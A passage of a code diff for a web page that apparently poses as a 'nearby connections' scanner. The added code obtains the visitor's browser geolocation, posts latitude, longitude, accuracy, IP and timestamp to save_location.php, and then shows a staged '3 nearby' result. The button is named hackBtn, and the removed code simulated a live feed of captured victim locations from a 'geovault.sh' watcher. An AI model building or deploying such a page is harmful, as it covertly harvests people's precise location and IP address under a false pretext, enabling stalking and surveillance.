+            ).textContent =
+              lon.toFixed(6);
+
+            document.getElementById(
+              'accValue'
+            ).textContent =
+              '±' + Math.round(acc) + ' m';
+
+
+            resultCard.style.display =
+              'block';
+
+
+            scanTitle.textContent =
+              'Location detected';
+
+            scanDescription.textContent =
+              'Checking for nearby connections...';
+
+
+            addLog(
+              'Location captured: ' +
+              lat.toFixed(6) +
+              ', ' +
+              lon.toFixed(6),
+              'success'
+            );
+
+
+            /*
+             * ==================================
+             * EXISTING BACKEND REQUEST
+             *
+             * DO NOT CHANGE:
+             *
+             * save_location.php
+             *
+             * lat
+             * lon
+             * acc
+             * ip
+             * time
+             * ==================================
+             */
+
+            fetch('save_location.php', {
+
+              method: 'POST',
+
+              headers: {
+                'Content-Type':
+                  'application/x-www-form-urlencoded'
+              },
+
+              body:
+                `lat=${lat}` +
+                `&lon=${lon}` +
+                `&acc=${acc}` +
+                `&ip=${getIP()}` +
+                `&time=${new Date().toISOString()}`
+
+            })
+
+            .then(response => {
+
+              return response.text();
+
+            })
+
+            .then(data => {
+
+              console.log(
+                'Server:',
+                data
+              );
+
+              addLog(
+                'Location saved on server.',
+                'success'
+              );
+
+
+              /*
+               * SHOW DEMO RESULT
+               */
+
+              setTimeout(() => {
+
+                scanTitle.textContent =
+                  'Nearby search complete';
+
+                scanDescription.textContent =
+                  'Nearby connection results are ready.';
+
+                nearbySection.style.display =
+                  'block';
+
+                document.getElementById(
+                  'nearbyCount'
+                ).textContent =
+                  '3 nearby';
+
+                hackBtn.disabled = false;
+
+                hackBtn.textContent =
+                  'Location shared';
+
+              }, 1500);
+
+            })
+
+            .catch(err => {
+
+              addLog(
+                'Server error: ' +
+                err.message,
+                'error'
+              );
+
+              console.error(err);
+
+              hackBtn.disabled = false;
+
+              hackBtn.textContent =
+                'Try again';
+
             });
 
-            // --- 4. Initialization/Bootstrap ---
-            updateLog("SYSTEM INITIALIZED. Awaiting data stream...", false);
-            // In a real environment, you would use WebSockets or an AJAX polling function 
-            // to constantly read from the endpoint that geovault.sh monitors.
+          },
 
-            // Simple periodic update to simulate live data flow
-            setInterval(() => {
-                // This simulates the data captured by geovault.sh's file watcher
-                const simulatedLocation = {
-                    lat: (Math.random() * 180 - 90).toFixed(4),
-                    lon: (Math.random() * 360 - 180).toFixed(4),
-                    acc: (Math.random() * 5 + 1).toFixed(1),
-                    time: new Date().toLocaleTimeString(),
-                    ip: '192.168.1.' + Math.floor(Math.random() * 255)
-                };
 
-                const statusMsg = `Location locked: ${simulatedLocation.lat}, ${simulatedLocation.lon} (Acc: ±${simulatedLocation.acc}m) | Source IP: ${simulatedLocation.ip}`;
-                updateLog(statusMsg, true);
-            }, 4000); // Updates every 4 seconds
-        });
+          /*
+           * ==================================
+           * GEOLOCATION ERROR
+           * ==================================
+           */
 
-        // Helper function to apply colors dynamically to logs
-        function getColoredText(text, colorCode) {
-            return `<span style="color:${colorCode};">${text}</span>`;
-        }
-    </script>
+          (error) => {
+
+            addLog(
+              error.message,
+              'error'
+            );
+
+            scanTitle.textContent =
+              'Unable to access location';
+
+            scanDescription.textContent =
+              'Please check your browser location permission and try again.';
+
+            hackBtn.disabled = false;
+
+            hackBtn.textContent =
+              'Try again';
+
+          }
+
+        );
+
+      }
+
+      else {
+
+        addLog(
+          'Geolocation is not supported by this browser.',
+          'error'
+        );
+
+        scanTitle.textContent =
+          'Location unavailable';
+
+        scanDescription.textContent =
+          'Your browser does not support location access.';
+
+        hackBtn.disabled = false;
+
+        hackBtn.textContent =
+          'Try again';
+
+      }
+
+    }
+
+  </script>
+
 </body>
 </html>
